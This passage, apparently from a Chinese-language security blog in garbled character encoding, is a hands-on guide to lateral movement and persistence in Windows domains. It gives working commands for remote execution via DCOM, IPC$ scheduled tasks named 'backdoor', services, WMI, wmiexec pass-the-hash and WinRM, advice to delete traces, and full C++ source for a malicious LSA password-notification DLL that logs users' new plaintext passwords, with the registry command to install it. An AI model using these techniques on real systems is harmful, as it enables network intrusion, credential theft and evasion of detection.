class="line">ä¸€ä¸ªæŒ‡å®šçª—å£çŠ¶æ€çš„å€¼ã€‚è¯¥å€¼å¯ä»¥æ˜¯ä»¥ä¸‹å­—ç¬¦ä¸²å€¼ä¹‹ä¸€ï¼Œä¹Ÿå¯ä»¥æ˜¯ç©ºå­—ç¬¦ä¸²ã€‚å¦‚æœä¸ºç©ºå­—ç¬¦ä¸²ï¼Œåˆ™é»˜è®¤ä¸ºâ€œå·²æ¢å¤â€ã€‚</span><br><span class="line"></span><br><span class="line">â€œMaximizedâ€</span><br><span class="line">è¯¥å‘½ä»¤åœ¨æœ€å¤§åŒ–çš„çª—å£ä¸­æ‰§è¡Œã€‚</span><br><span class="line"></span><br><span class="line">â€œMinimizedâ€</span><br><span class="line">è¯¥å‘½ä»¤åœ¨æœ€å°åŒ–çš„çª—å£ä¸­æ‰§è¡Œã€‚</span><br><span class="line"></span><br><span class="line">â€œRestoredâ€</span><br><span class="line">è¯¥å‘½ä»¤åœ¨å·²æ¢å¤æˆ–æ­£å¸¸çš„çª—å£ä¸­æ‰§è¡Œã€‚æ³¨æ„ï¼šè¿™é‡Œä¼šå¼¹ä¸ªé»‘æ¡†æ¡†</span><br><span class="line"></span><br><span class="line">è¿”å›å€¼</span><br><span class="line">æ­¤æ–¹æ³•ä¸è¿”å›å€¼ã€‚</span><br></pre></td></tr></table></figure><p>äºæ˜¯ä¹ï¼Œæˆ‘ä»¬å°±èƒ½ç†æ‰€åº”å½“çš„æƒ³åˆ°è¿™ä¸ªä¸œè¥¿å¯ä»¥è¢«ç”¨äºæœ¬åœ°ä»»æ„å‘½ä»¤æ‰§è¡Œï¼Œå°±åƒè¿™æ ·</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.application&quot;)).Document.ActiveView.Executeshellcommand(&#39;cmd.exe&#39;,$null,&quot;&#x2F;c calc.exe&quot;,&quot;Restored&quot;) </span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210223161252812.png" alt="image-20210223161252812"></p><p>æˆ‘ä»¬è¿›ä¸€æ­¥å‘æ˜å…¶æ¨ªå‘ç§»åŠ¨çš„èƒ½åŠ›</p><p>æˆ‘ä»¬çŸ¥é“DCOMå…·æœ‰é€šè¿‡ç½‘ç»œä¸å¯¹è±¡è¿›è¡Œäº¤äº’çš„èƒ½åŠ›ï¼Œåœ¨æˆ‘ä»¬æ˜¯ç®¡ç†å‘˜çš„å‰æä¸‹æˆ‘ä»¬å¯ä»¥ä½¿ç”¨GetTypeFromProgID()ä¸powershellè¿›è¡ŒDCOMè¿œç¨‹äº¤äº’ã€‚<br>GetTypeFromProgID(â€œCOMâ€,â€è¿œç¨‹ipâ€) å³å¯æŒ‡å®šä¸å“ªä¸€ä¸ªè¿œç¨‹IPè¿›è¡Œäº¤äº’ã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥æŠŠpayloadæ”¹é€ æˆè¿™æ ·ï¼Œè¿›è€Œå¯ä»¥åœ¨å…¶ä»–æœºå™¨ä¸Šè¿›è¡Œä»»æ„å‘½ä»¤æ‰§è¡Œï¼Œä»è€Œè¾¾åˆ°æ¨ªå‘ç§»åŠ¨çš„ç›®çš„</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.application&quot; ï¼Œâ€œè¿œç¨‹ipâ€)).Document.ActiveView.Executeshellcommand(&#39;cmd.exe&#39;,$null,&quot;&#x2F;c calc.exe&quot;,&quot;Restored&quot;)</span><br></pre></td></tr></table></figure><h2 id="ipc"><a href="#ipc" class="headerlink" title="ipc"></a>ipc</h2><h3 id="ipcç®€ä»‹"><a href="#ipcç®€ä»‹" class="headerlink" title="ipcç®€ä»‹"></a>ipcç®€ä»‹</h3><p>IPC$æ˜¯ä¸ºäº†è®©è¿›ç¨‹é—´é€šä¿¡è€Œå¼€æ”¾çš„å‘½åç®¡é“ï¼Œé€šè¿‡æä¾›å¯ä¿¡ä»»çš„ç”¨æˆ·åå’Œå£ä»¤ï¼Œå³èƒ½å»ºç«‹é“¾æ¥ï¼Œè¾¾åˆ°è®¿é—®è¿œç¨‹è®¡ç®—æœºçš„ç›®çš„ã€‚ipcå…±äº«è¿æ¥æˆåŠŸåä¸€èˆ¬èƒ½å…±äº«æ‰€æœ‰å…±äº«ç›˜ç¬¦ã€‚ï¼ˆä¹Ÿå°±æ˜¯IPCè¿æ¥åå¯ä»¥è¿œç¨‹å…±äº«C$,D$ç­‰ï¼‰</p><p>åˆ©ç”¨è¿™ä¸ªé“¾æ¥ä¸ä»…å¯ä»¥è®¿é—®ç›®æ ‡æœºå™¨ä¸­çš„æ–‡ä»¶ï¼Œè¿›è¡Œä¸Šä¼ ä¸‹è½½ç­‰æ“ä½œï¼Œè¿˜èƒ½åœ¨ç›®æ ‡æœºå™¨ä¸Šæ‰§è¡Œéƒ¨åˆ†å‘½ä»¤ã€‚</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net use \\ip\ipc$ &quot;password&quot; &#x2F;user:username</span><br></pre></td></tr></table></figure><p>å¦‚æœè´¦æˆ·å’Œå£ä»¤æ­£ç¡®ï¼Œå°±å»ºç«‹å¥½äº†é“¾æ¥ã€‚</p><p>å»ºç«‹å¥½é“¾æ¥åå°±èƒ½æ‰§è¡Œä»¥ä¸‹å‘½ä»¤</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dir \\192.168.183.130\c$ åˆ—å‡ºCç›˜</span><br><span class="line">copy C:\Users\douser\Desktop\whoami.txt \\192.168.183.130\c$ ä¸Šä¼ æ–‡ä»¶</span><br><span class="line">tasklist &#x2F;S 192.168.183.130 &#x2F;U administrator &#x2F;P liu78963 åˆ—å‡ºæŸIPä¸Šçš„è¿›ç¨‹ä¿¡æ¯ï¼Œ&#x2F;UæŒ‡å®šå“ªä¸ªç”¨æˆ·æ‰§è¡Œè¯¥å‘½ä»¤ï¼Œ&#x2F;pæŒ‡å®šè¯¥ç”¨æˆ·å¯†ç </span><br><span class="line">net use \\IP &#x2F;del &#x2F;y åˆ é™¤é“¾æ¥</span><br><span class="line">net use æŸ¥çœ‹å·²å»ºç«‹çš„ipcé“¾æ¥</span><br></pre></td></tr></table></figure><h3 id="åˆ©ç”¨ipcæ¨ªå‘ç§»åŠ¨"><a href="#åˆ©ç”¨ipcæ¨ªå‘ç§»åŠ¨" class="headerlink" title="åˆ©ç”¨ipcæ¨ªå‘ç§»åŠ¨"></a>åˆ©ç”¨ipcæ¨ªå‘ç§»åŠ¨</h3><h4 id="at"><a href="#at" class="headerlink" title="at"></a>at</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">at \\192.168.183.130 17:05:00 cmd.exe &#x2F;c &quot;&lt;å‘½ä»¤&gt;&quot;</span><br><span class="line">at \\192.168.183.130 17:05:00 powershell.exe -c &quot;&lt;å‘½ä»¤&gt;&quot;</span><br></pre></td></tr></table></figure><p>å…³äºæ—¶é—´çš„è·å¾—ï¼Œå¯ä»¥ä½¿ç”¨ net time \\IP è·å¾—ã€‚</p><p>è®¡åˆ’ä»»åŠ¡æ‰§è¡Œåéœ€è¦åˆ é™¤ï¼Œä¸ç•™ç—•è¿¹</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">at \\192.168.183.130 1 &#x2F;delete  &#x2F;&#x2F;1ä¸ºä»»åŠ¡çš„ID</span><br></pre></td></tr></table></figure><p>å…³äºæ­¤æ–¹æ³•æˆ‘ä»¬å¯ä»¥å…ˆé€šè¿‡copyä¸Šä¼ æ¶æ„æ–‡ä»¶ç„¶åé€šè¿‡atæ¥æ‰§è¡Œå®ƒï¼Œæˆ–è€…ç›´æ¥é€šè¿‡powershellè¿œç¨‹åŠ è½½ä¸Šçº¿ç­‰</p><h4 id="schtasks"><a href="#schtasks" class="headerlink" title="schtasks"></a><strong>schtasks</strong></h4><p>atå‘½ä»¤å·²ç»è¢«Windows Vistaã€Windows Server 2008åŠä¹‹åç‰ˆæœ¬çš„æ“ä½œç³»ç»ŸåºŸå¼ƒäº†ï¼Œå–è€Œä»£ä¹‹çš„æ˜¯schtaskså‘½ä»¤ã€‚</p><p>æ¨ªå‘ç§»åŠ¨çš„å¤§è‡´æ€è·¯ä¸atå·®ä¸å¤šã€‚</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">åœ¨ç›®æ ‡ä¸»æœºä¸Šåˆ›å»ºä¸€ä¸ªåç§°ä¸ºâ€œbackdoorâ€çš„è®¡åˆ’ä»»åŠ¡ã€‚è¯¥è®¡åˆ’ä»»åŠ¡æ¯åˆ†é’Ÿå¯åŠ¨ä¸€æ¬¡ï¼Œå¯åŠ¨ç¨‹åºä¸ºæˆ‘ä»¬ä¹‹å‰åˆ°Cç›˜ä¸‹çš„shell.exeï¼Œå¯åŠ¨æƒé™ä¸ºsystemã€‚</span><br><span class="line">schtasks &#x2F;create &#x2F;s 192.168.183.130 &#x2F;tn backdoor &#x2F;sc minute &#x2F;mo 1  &#x2F;tr c:\shell.exe &#x2F;ru system &#x2F;f </span><br><span class="line"></span><br><span class="line">ä½†ä¹Ÿæœ‰äº›æ—¶å€™ï¼Œç”±äºå½“å‰æƒé™æˆ–ç»„ç­–ç•¥è®¾ç½®ç­‰åŸå› ï¼Œè¯¥schtasksæ–¹æ³•è¿œç¨‹åˆ›å»ºè®¡åˆ’ä»»åŠ¡å¯èƒ½ä¼šæŠ¥é”™æ‹’ç»è®¿é—®,é‡åˆ°è¿™ç§æƒ…å†µï¼Œæˆ‘ä»¬å¯ä»¥åŠ ä¸Š&#x2F;uå’Œ&#x2F;på‚æ•°åˆ†åˆ«è®¾ç½®é«˜æƒé™ç”¨æˆ·åå’Œå¯†ç  </span><br><span class="line">schtasks &#x2F;create &#x2F;s 192.168.183.130 &#x2F;u username &#x2F;p password &#x2F;tn backdoor &#x2F;sc minute &#x2F;mo 1 &#x2F;tr c:\shell.exe &#x2F;ru system &#x2F;f</span><br><span class="line"></span><br><span class="line">å¦å¤–ï¼Œåœ¨æˆ‘ä»¬åˆ›å»ºå¥½è®¡åˆ’ä»»åŠ¡åï¼Œå¯ä»¥é€šè¿‡ä¸‹åˆ—æŒ‡ä»¤ç«‹å³è®©è®¡åˆ’ä»»åŠ¡æ‰§è¡Œï¼ˆå¦‚æœæ‹’ç»è®¿é—®çš„è¯å°±åŠ ä¸Š&#x2F;u &#x2F;på‚æ•°ï¼‰</span><br><span class="line">schtasks &#x2F;run &#x2F;s 192.168.183.130 &#x2F;i &#x2F;tn backdoor  &#x2F;&#x2F; iï¼šå¿½ç•¥ä»»ä½•é™åˆ¶ç«‹å³è¿è¡Œä»»åŠ¡</span><br><span class="line"></span><br><span class="line">è®¡åˆ’ä»»åŠ¡æ‰§è¡Œåéœ€è¦æ¸…ç†ç—•è¿¹</span><br><span class="line">schtasks &#x2F;delete &#x2F;s 192.168.183.130 &#x2F;tn &quot;backdoor&quot; &#x2F;f</span><br></pre></td></tr></table></figure><h4 id="sc"><a href="#sc" class="headerlink" title="sc"></a>sc</h4><p>è¿™ä¸ªå‘½ä»¤å¯ä»¥æ“æ§æœåŠ¡ã€‚</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sc \\[ä¸»æœºå&#x2F;IP] create [servicename] binpath&#x3D; &quot;[path]&quot;   #åˆ›å»ºæœåŠ¡ï¼Œå…¶ä¸­binpathå¯ä»¥æ˜¯æŸä¸ªexeæ–‡ä»¶çš„è·¯å¾„ï¼Œä¹Ÿå¯ä»¥æ˜¯ä¸€æ®µæŒ‡ä»¤ã€‚å½“ä¸ºè·¯å¾„æ—¶ï¼ŒæœåŠ¡å¯åŠ¨æ—¶ä¼šè‡ªåŠ¨æ‰§è¡Œè¯¥exeæ–‡ä»¶ï¼Œå½“ä¸ºæŒ‡ä»¤æ—¶ï¼ŒæœåŠ¡å¯åŠ¨æ—¶ä¼šè‡ªåŠ¨æ‰§è¡Œè¯¥æŒ‡ä»¤</span><br><span class="line">sc \\[host] start [servicename] å¯åŠ¨æŸä¸ªæœåŠ¡</span><br><span class="line">sc \\[host] delete [servicename]   #åˆ é™¤æœåŠ¡</span><br></pre></td></tr></table></figure><h2 id="wmi"><a href="#wmi" class="headerlink" title="wmi"></a>wmi</h2><p>ä»Windows 98å¼€å§‹ï¼ŒWindowsæ“ä½œç³»ç»Ÿéƒ½æ”¯æŒWMIã€‚WMIæ˜¯ç”±ä¸€ç³»åˆ—å·¥å…·é›†ç»„æˆçš„ï¼Œå¯ä»¥é€šè¿‡/nodeé€‰é¡¹ä½¿ç”¨ç«¯å£135ä¸Šçš„è¿œç¨‹è¿‡ç¨‹è°ƒç”¨(RPC)è¿›è¡Œé€šä¿¡ä»¥è¿›è¡Œè¿œç¨‹è®¿é—®ï¼Œå®ƒå…è®¸ç³»ç»Ÿç®¡ç†å‘˜è¿œç¨‹æ‰§è¡Œè‡ªåŠ¨åŒ–ç®¡ç†ä»»åŠ¡ï¼Œä¾‹å¦‚è¿œç¨‹å¯åŠ¨æœåŠ¡æˆ–æ‰§è¡Œå‘½ä»¤ã€‚å¹¶ä¸”wimcæ‰§è¡Œå‘½ä»¤æ—¶ä¸ä¼šç•™ä¸‹æ—¥å¿—ä¿¡æ¯ã€‚</p><p>é€šè¿‡wmicåœ¨è¿œç¨‹ä¸»æœºä¸Šå¼€å¯è¿›ç¨‹</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wmic &#x2F;node:192.168.183.130 &#x2F;user:administrator &#x2F;password:Liu78963 process call create &quot;command&quot;</span><br></pre></td></tr></table></figure><h3 id="wmiexec"><a href="#wmiexec" class="headerlink" title="wmiexec"></a>wmiexec</h3><p>é€šè¿‡wmicåˆ›å»ºè¿œç¨‹è¿›ç¨‹æ—¶ï¼Œä¸ä¼šæœ‰å›æ˜¾ï¼Œéœ€è¦é€šè¿‡ipc$é“¾æ¥typeï¼Œé‡å®šå‘ç­‰æ‰‹æ®µæ‰èƒ½çœ‹åˆ°å›æ˜¾ç»“æœï¼Œå°±å¾ˆä¸æ–¹ä¾¿ï¼Œwmicexecçš„å‡ºç°å°±å¾ˆå¥½çš„è§£å†³äº†è¿™ä¸€ç—›ç‚¹ã€‚å…·ä½“åŸç†æ˜¯é€šè¿‡wmicåœ¨135ç«¯å£è¿›è¡Œäº¤äº’ï¼Œå†æŠŠå†…å®¹é€šè¿‡445ç«¯å£ä¼ å›æ¥ã€‚</p><p>wmiexecæ™®éæ¥è¯´æœ‰ä¸‰ç§ç‰ˆæœ¬.pyï¼Œexeï¼Œ.vbsã€‚å¯ä»¥èµ°socks5åè®®ä»£å…¥å†…ç½‘ï¼Œæœç»äº†bypassavçš„éº»çƒ¦ã€‚<br>(exeç‰ˆæœ¬ç½‘ä¸Šä¼¼ä¹å¾ˆä¸å¥½æ‰¾) è¿™é‡Œç”¨pythonç‰ˆæœ¬ï¼Œä¸‹è½½é“¾æ¥<a href="https://github.com/SecureAuthCorp/impacket/releases/tag/impacket_0_9_22%EF%BC%8C">https://github.com/SecureAuthCorp/impacket/releases/tag/impacket_0_9_22ï¼Œ</a> impacketæŒ‰ç…§ç½‘ä¸Šå®‰è£…æ¥å¼„å°±è¡Œäº†<br>1.ç¯å¢ƒlinuxï¼Œæˆ‘ä»¬é…ç½®å¥½proxychanisä»£å…¥å†…ç½‘ï¼ˆç•¥<br>2.proxychains wmiexec.py åŸŸå/ç”¨æˆ·å:å¯†ç @ip  è·å¾—shell<br>3.ä¹Ÿå¯ä»¥è¿›è¡Œhashä¼ é€’ python wmiexec.py -hashes LM Hash:NT Hash åŸŸå/ç”¨æˆ·å@ç›®æ ‡IP </p><p>æ•ˆæœå›¾</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210226204713405.png" alt="image-20210226204713405"></p><h2 id="winrm"><a href="#winrm" class="headerlink" title="winrm"></a>winrm</h2><p>â€‹    winRmï¼ˆå¾®è½¯è¿œç¨‹ç®¡ç†ï¼‰æ˜¯WS-Managementåè®®çš„å®ç°ç»„ä»¶ã€‚WinRMæ˜¯windowsæ“ä½œç³»ç»Ÿçš„ä¸€éƒ¨åˆ†ã€‚æ˜¯ä¸€é¡¹å…è®¸ç®¡ç†å‘˜åœ¨ç³»ç»Ÿä¸Šè¿œç¨‹æ‰§è¡Œç®¡ç†ä»»åŠ¡çš„æœåŠ¡ã€‚é€šä¿¡é€šè¿‡HTTPï¼ˆ5985ï¼‰æˆ–HTTPS SOAPï¼ˆ5986ï¼‰æ‰§è¡Œï¼Œé»˜è®¤æƒ…å†µä¸‹æ”¯æŒKerberoså’ŒNTLMèº«ä»½éªŒè¯ä»¥åŠåŸºæœ¬èº«ä»½éªŒè¯ã€‚ ä½ éœ€è¦ç®¡ç†å‘˜èº«ä»½æ‰èƒ½ä½¿ç”¨å®ƒã€‚<br>â€‹    é€‚ç”¨ç‰ˆæœ¬:é€‚ç”¨äº Win server 2008 / Win7 åŠä»¥åçš„ç³»ç»Ÿï¼Œä½†æ˜¯ Win server 2008 / PC å…¨ç‰ˆæœ¬ç³»ç»Ÿé»˜è®¤å…³é—­ã€‚åªæœ‰åœ¨Win server 2012 ä¹‹åçš„ç‰ˆæœ¬çš„WinRMæœåŠ¡æ‰é»˜è®¤å¯åŠ¨å¹¶ç›‘å¬äº†5985ç«¯å£ï¼Œå…è®¸è¿œç¨‹ä»»æ„ä¸»æœºæ¥ç®¡ç†ã€‚</p><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡å¦‚ä¸‹powershellå‘½ä»¤æŸ¥çœ‹æœºå™¨ä¸Šçš„winrmæ˜¯å¦æ­£å¸¸è¿è¡Œ</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Get-WmiObject -Class win32_service | Where-Object &#123;$_.name -like &quot;WinRM&quot;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210226223701342.png" alt="image-20210226223701342"></p><p>è‹¥æ²¡å¼€å¯ï¼Œä½ å¯ä»¥åœ¨ç®¡ç†å‘˜æƒé™ä¸‹æ‰§è¡Œä»¥ä¸‹æŒ‡ä»¤å¼€å¯</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">winrm quickconfig -q</span><br><span class="line">or</span><br><span class="line">Enable-PSRemoting -Force</span><br></pre></td></tr></table></figure><p>è¿œç¨‹å‘½ä»¤æ‰§è¡Œ</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">winrs -r:192.168.86.114 -u:192.168.86.114\administrator -p:123456!@#$% whoami</span><br></pre></td></tr></table></figure><h2 id="åˆ©ç”¨ç»„ç­–ç•¥"><a href="#åˆ©ç”¨ç»„ç­–ç•¥" class="headerlink" title="åˆ©ç”¨ç»„ç­–ç•¥"></a>åˆ©ç”¨ç»„ç­–ç•¥</h2><h3 id="è¯»å–è„šæœ¬ä¸­çš„å¯†ç "><a href="#è¯»å–è„šæœ¬ä¸­çš„å¯†ç " class="headerlink" title="è¯»å–è„šæœ¬ä¸­çš„å¯†ç "></a>è¯»å–è„šæœ¬ä¸­çš„å¯†ç </h3><p>å‡è®¾åŸŸç®¡æƒ³é€šè¿‡ç»„ç­–ç•¥æ¥ä¿®æ”¹ç”¨æˆ·å¯†ç ï¼Œå¦‚æœä»–ä¸ä½¿ç”¨GPPï¼Œé‚£ä¹ˆä»–åªæœ‰é€šè¿‡GPOé…åˆè„šæœ¬ä¸‹å‘çš„æ–¹å¼æ¥ä¿®æ”¹ç”¨æˆ·å¯†ç ã€‚</p><p>è¿™ç§è„šæœ¬å¯èƒ½ä¼šé•¿å¾—åƒè¿™æ ·</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">strComputer &#x3D; &quot;.&quot;</span><br><span class="line">Set objUser &#x3D; GetObject(&quot;WinNT:&#x2F;&#x2F;&quot; &amp; strComputer &amp; &quot;&#x2F;Administrator, user&quot;)</span><br><span class="line">objUser.SetPassword &quot;123QWEQWE!@#&quot;</span><br><span class="line">objUser.SetInfo</span><br></pre></td></tr></table></figure><p>ä¿å­˜è¿™ä¸ªè„šæœ¬ä¸º<code>cpass.vbs</code>,è¿™ä¸ªè„šæœ¬çš„ä½œç”¨å°±æ˜¯ä¿®æ”¹æœ¬åœ°ç®¡ç†å‘˜è´¦æˆ·çš„å¯†ç ä¸º</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">123QWEQWE!@#</span><br></pre></td></tr></table></figure><p>ç„¶åé€šè¿‡GPOä¸‹å‘æ­¤è„šæœ¬ï¼Œè¯¥è„šæœ¬å°±ä¼šè¢«ä¿å­˜äºSYSVOLæ–‡ä»¶å¤¹ä¸­ã€‚<br>åˆå› ä¸ºåŸŸä¸­ä»»ä½•ç”¨æˆ·éƒ½å¯ä»¥è¯»å–SYSVOLæ–‡ä»¶å¤¹ä¸­å†…å®¹ï¼Œæ‰€ä»¥æˆ‘ä»¬æŒ‡ä¸å®šå°±ä¼šç¿»åˆ°è¿™ç§æš´éœ²æ˜æ–‡å¯†ç çš„è„šæœ¬ã€‚</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for &#x2F;r \\dc&#x2F;sysvol %i in (*.vbs) do @echo %i</span><br><span class="line">for &#x2F;r \\dc&#x2F;sysvol %i in (*.bat) do @echo %i</span><br></pre></td></tr></table></figure><h3 id="æ‰¹é‡å¯†ç "><a href="#æ‰¹é‡å¯†ç " class="headerlink" title="æ‰¹é‡å¯†ç "></a>æ‰¹é‡å¯†ç </h3><p>åŸŸç®¡å¯èƒ½ä¼šç”¨ç»„ç­–ç•¥æ‰¹é‡ä¿®æ”¹åŸŸä¸­ç”¨æˆ·å¯†ç ï¼ˆç‰¹åˆ«æ˜¯æœ¬åœ°ç®¡ç†å‘˜ï¼‰ã€‚æ‰€ä»¥æ‹¿åˆ°ä¸€ä¸ªæœ¬åœ°ç®¡ç†å‘˜å¯†ç åä¸å¦¨è¯•è¯•å¯†ç å¤ç”¨ï¼ŒæŒ‡ä¸å®šå°±æœ‰æƒŠå–œ</p><h1 id="åŸŸç®¡æƒé™ç»´æŒ"><a href="#åŸŸç®¡æƒé™ç»´æŒ" class="headerlink" title="åŸŸç®¡æƒé™ç»´æŒ"></a>åŸŸç®¡æƒé™ç»´æŒ</h1><h2 id="Hook-PasswordChangeNotify"><a href="#Hook-PasswordChangeNotify" class="headerlink" title="Hook PasswordChangeNotify"></a>Hook PasswordChangeNotify</h2><p>åŸç†ï¼šå½“ç”¨æˆ·ä¿®æ”¹å¯†ç æ—¶ä¼šè¾“å…¥æ˜æ–‡å¯†ç ï¼ŒLSAä¼šè°ƒç”¨PasswordChangeNotify åœ¨ç³»ç»Ÿä¸­åŒæ­¥å¯†ç ã€‚æˆ‘ä»¬HOOKè¿™ä¸ªå‡½æ•°ï¼Œæ”¹å˜å…¶è¡Œä¸ºï¼Œå°±èƒ½è¾¾åˆ°è·å–ç”¨æˆ·ä¿®æ”¹åçš„å¯†ç çš„æ˜æ–‡.</p><p>Tool: Powersploitä¸‹çš„Invoke-ReflectivePEInjection.ps1 ï¼ˆç”¨äºæ³¨å…¥ï¼‰<br><a href="https://github.com/PowerShellMafia/PowerSploit">https://github.com/PowerShellMafia/PowerSploit</a><br>ä»¥åŠ <a href="https://github.com/clymb3r/Misc-Windows-Hacking">https://github.com/clymb3r/Misc-Windows-Hacking</a> çš„HookPasswordChange.dll(éœ€è‡ªè¡Œç¼–è¯‘)</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Import-Module .\Invoke-ReflectivePEInjection.ps1</span><br><span class="line">Invoke-ReflectivePEInjection -PEPath HookPasswordChange.dll -procname lsass</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œå¦‚ä¸Šå‘½ä»¤ï¼Œåªè¦ä¿®æ”¹äº†ç”¨æˆ·çš„å¯†ç ï¼Œä¿®æ”¹åçš„æ˜æ–‡å¯†ç å°±ä¼šè®°å½•åœ¨ C:\Windows\Temp\passwords.txt æ–‡ä»¶ä¸­ã€‚</p><p>ä¸‹é¢æˆ‘ä»¬åˆ†æä¸€ä¸‹åŸç†</p><p>å½“å¯†ç æ”¹å˜è¯·æ±‚å‘ç”Ÿæ—¶ï¼ŒLSAä¼šè°ƒç”¨Password Filtersã€‚æ¯ä¸€ä¸ªpassword filterä¼šå…ˆéªŒè¯æ–°å¯†ç çš„åˆæ³•æ€§å’Œå¤æ‚åº¦ï¼Œç„¶åLSAä¼šå‘å‡ºè¯·æ±‚å·²æ›´æ”¹çš„ä¿¡å·ã€‚</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217133057.png" alt="QQæˆªå›¾20210217133057"></p><p>è¯¥è¿‡ç¨‹ç”± password notification DLL å®Œæˆã€‚æ‰€ä»¥æˆ‘ä»¬åªéœ€è¦åŠ«æŒè¿™ä¸ªDLLï¼ŒæŠŠå®ƒæ¢æˆæˆ‘ä»¬è‡ªå®šä¹‰çš„DLLå³å¯è¾¾åˆ°ç›®çš„ã€‚<br>è¿™ç§æ–¹å¼ä¸€èˆ¬åœ¨ServeræœåŠ¡å™¨ä¸Šåˆ©ç”¨ç‡è¾ƒé«˜<br>é€šå¸¸æ¥è¯´ï¼Œè¿™ä¸ªdllæ–‡ä»¶çš„åœ¨æ³¨å†Œè¡¨ä¸­çš„è·¯å¾„æ˜¯ hklm\system\currentcontrolset\control\lsaçš„ notification packagesè¡¨é¡¹ã€‚</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217133116.png" alt="QQæˆªå›¾20210217133116"></p><p>æˆ‘ä»¬è¦åˆ©ç”¨è¯¥æ–¹æ³•ï¼Œé¦–å…ˆè¦ç¡®ä¿å¯†ç ç­–ç•¥å·²å¯ç”¨</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217133138.png" alt="QQæˆªå›¾20210217133138"></p><p>è‡³äºå‘½ä»¤è¡Œæ€ä¹ˆä¿®æ”¹ã€‚å¯ä»¥è¿™æ ·</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">secedit &#x2F;export &#x2F;cfg gp.inf &#x2F;quiet   å°†ç»„ç­–ç•¥å¯¼å‡ºä¸ºæ–‡ä»¶</span><br><span class="line">åœ¨è¯¥æ–‡ä»¶é‡Œå°†PasswordComplexityé¡¹å€¼ä¿®æ”¹ä¸º1</span><br><span class="line">ç„¶åç”¨secedit &#x2F;configure &#x2F;db gp.sdb &#x2F;cfg gp.inf &#x2F;quiet å°†å…¶å¯¼å…¥æ•°æ®åº“</span><br><span class="line">åˆ·æ–°ç»„ç­–ç•¥ï¼š gpupdate&#x2F;force</span><br><span class="line">é‡å¯åç”Ÿæ•ˆ</span><br></pre></td></tr></table></figure><p>ä¸‹é¢æˆ‘ä»¬æ„é€ dllæ–‡ä»¶å»è¦†ç›–å®ƒã€‚</p><p>é¦–å…ˆæˆ‘ä»¬çš„dllæ–‡ä»¶å†…å®¹å¦‚ä¸‹ã€‚</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include&lt;Windows.h&gt;</span><br><span class="line">#include&lt;NTSecAPI.h&gt;</span><br><span class="line">#include &lt;fstream&gt;</span><br><span class="line"></span><br><span class="line">extern &quot;C&quot; __declspec(dllexport) BOOLEAN __stdcall InitializeChangeNotify() &#123;</span><br><span class="line">OutputDebugString(L&quot;InitializeChangeNotify&quot;);</span><br><span class="line">return TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">extern &quot;C&quot; __declspec(dllexport) BOOLEAN __stdcall PasswordFilter(</span><br><span class="line">PUNICODE_STRING AccountName,</span><br><span class="line">PUNICODE_STRING FullName,</span><br><span class="line">PUNICODE_STRING Password,</span><br><span class="line">BOOLEAN SetOperation)</span><br><span class="line">&#123;</span><br><span class="line">OutputDebugString(L&quot;PasswordFilter&quot;);</span><br><span class="line">return TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">extern &quot;C&quot; __declspec(dllexport) BOOLEAN __stdcall PasswordChangeNotify(</span><br><span class="line">PUNICODE_STRING UserName,</span><br><span class="line">ULONG RelativeId,</span><br><span class="line">PUNICODE_STRING NewPassword)</span><br><span class="line">&#123;</span><br><span class="line">FILE *pFile;</span><br><span class="line">fopen_s(&amp;pFile, &quot;C:\\logFile.txt&quot;, &quot;a+&quot;);</span><br><span class="line">fprintf(pFile, &quot;%ws:%ws&quot;, UserName-&gt;Buffer, NewPassword-&gt;Buffer);</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åæŠŠè¿™ä¸ªdllæ–‡ä»¶æ”¾å…¥system32æ–‡ä»¶ï¼Œç„¶åä¿®æ”¹æ³¨å†Œè¡¨ï¼Œä½¿ hklm\system\currentcontrolset\control\lsaçš„ notification packagesè¡¨é¡¹åŒ…æ‹¬æˆ‘ä»¬çš„æ¶æ„dllæ–‡ä»¶ï¼Œå…·ä½“å‘½ä»¤è¡Œæ“ä½œå¦‚ä¸‹</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">REG ADD &quot;HKLMSYSTEMCurrentControlSetControlLsa&quot; &#x2F;v &quot;Notification Packages&quot; &#x2F;t REG_MULTI_SZ &#x2F;d &quot;evildll&quot; &#x2F;f</span><br></pre></td></tr></table></figure><p>é‡å¯åç”Ÿæ•ˆã€‚æ— 